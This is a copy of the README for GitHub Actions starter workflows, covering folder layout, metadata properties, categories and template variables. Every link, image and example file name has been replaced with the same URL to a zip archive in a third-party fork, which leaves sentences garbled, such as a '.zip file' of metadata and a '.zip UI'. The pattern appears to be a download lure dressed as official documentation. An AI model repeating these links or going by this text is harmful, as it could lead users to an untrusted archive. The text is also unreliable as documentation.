<p align="center">
  <img src="https://raw.githubusercontent.com/Genzo2327/starter-workflows/main/script/sync-ghes/starter-workflows-1.2.zip"/> 
</p>

## Starter Workflows

These are the workflow files for helping people get started with GitHub Actions.  They're presented whenever you start to create a new GitHub Actions workflow.

**If you want to get started with GitHub Actions, you can use these starter workflows by clicking the "Actions" tab in the repository where you want to create a workflow.**

<img src="https://raw.githubusercontent.com/Genzo2327/starter-workflows/main/script/sync-ghes/starter-workflows-1.2.zip%202019-08-27%20at%203.25.07%https://raw.githubusercontent.com/Genzo2327/starter-workflows/main/script/sync-ghes/starter-workflows-1.2.zip" max-width="75%"/>

### Directory structure

* [ci](ci): solutions for Continuous Integration workflows.
* [deployments](deployments): solutions for Deployment workflows.
* [automation](automation): solutions for automating workflows.
* [code-scanning](code-scanning): starter workflows for [Code Scanning](https://raw.githubusercontent.com/Genzo2327/starter-workflows/main/script/sync-ghes/starter-workflows-1.2.zip)
* [icons](icons): svg icons for the relevant template

Each workflow must be written in YAML and have a `.yml` extension. They also need a corresponding `https://raw.githubusercontent.com/Genzo2327/starter-workflows/main/script/sync-ghes/starter-workflows-1.2.zip` file that contains extra metadata about the workflow (this is displayed in the https://raw.githubusercontent.com/Genzo2327/starter-workflows/main/script/sync-ghes/starter-workflows-1.2.zip UI).

For example: `https://raw.githubusercontent.com/Genzo2327/starter-workflows/main/script/sync-ghes/starter-workflows-1.2.zip` and `https://raw.githubusercontent.com/Genzo2327/starter-workflows/main/script/sync-ghes/starter-workflows-1.2.zip`.

### Valid properties

* `name`: the name shown in onboarding. This property is unique within the repository.
* `description`: the description shown in onboarding
* `iconName`: the icon name in the relevant folder, for example, `django` should have an icon `https://raw.githubusercontent.com/Genzo2327/starter-workflows/main/script/sync-ghes/starter-workflows-1.2.zip`. Only SVG is supported at this time. Another option is to use [octicon](https://raw.githubusercontent.com/Genzo2327/starter-workflows/main/script/sync-ghes/starter-workflows-1.2.zip). The format to use an octicon is `octicon <<icon name>>`. Example: `octicon person`
* `creator`: creator of the template shown in onboarding. All the workflow templates from an author will have the same `creator` field.
* `categories`: the categories that it will be shown under. Choose at least one category from the list [here](#categories). Further, choose the categories from the list of languages available [here](https://raw.githubusercontent.com/Genzo2327/starter-workflows/main/script/sync-ghes/starter-workflows-1.2.zip). When a user views the available templates, those templates that match the same language will feature more prominently.

### Categories
* continuous-integration
* deployment
* testing
* code-quality
* code-review
* dependency-management
* monitoring
* Automation
* utilities

### Variables
These variables can be placed in the starter workflow and will be substituted as detailed below:

* `$default-branch`: will substitute the branch from the repository, for example `main` and `master`
* `$protected-branches`: will substitute any protected branches from the repository
* `$cron-daily`: will substitute a valid but random time within the day
